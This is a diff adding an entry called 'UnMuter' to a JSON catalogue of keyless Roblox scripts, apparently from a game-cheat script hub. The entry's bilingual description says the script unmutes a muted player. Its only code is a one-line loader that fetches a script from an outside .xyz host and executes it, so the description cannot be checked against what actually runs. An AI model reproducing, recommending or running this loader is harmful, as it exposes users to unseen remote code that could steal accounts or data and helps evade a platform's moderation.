@@ -55,6 +55,14 @@
       "game": "Rivals",
       "keyless": true,
       "date": "2026-04-18"
+    },
+    "script_1776530259": {
+      "name": "UnMuter",
+      "description": "\uD83C\uDDFA\uD83C\uDDF8 : FD simply, this script unmutes you if you was muted. Has a few functions\n\uD83C\uDDF7\uD83C\uDDFA : FD \u044D\u0442\u043E\u0442 \u0441\u043A\u0440\u0438\u043F\u0442 \u043F\u0440\u043E\u0441\u0442\u043E \u0440\u0430\u0437\u043C\u044C\u044E\u0442\u0438\u0432\u0430\u0435\u0442 \u0442\u0435\u0431\u044F \u0435\u0441\u043B\u0438 \u0442\u044B \u0431\u044B\u043B \u0437\u0430\u043C\u044C\u044E\u0442\u0435\u043D. \u0418\u043C\u0435\u0435\u0442 \u043F\u0430\u0440\u0443 \u0444\u0443\u043D\u043A\u0446\u0438\u0439",
+      "code": "loadstring(game:HttpGet(\u0022https://mois7.xyz/loader\u0022))()",
+      "game": "Universal",
+      "keyless": true,
+      "date": "2026-04-18"
     }
   }
 }
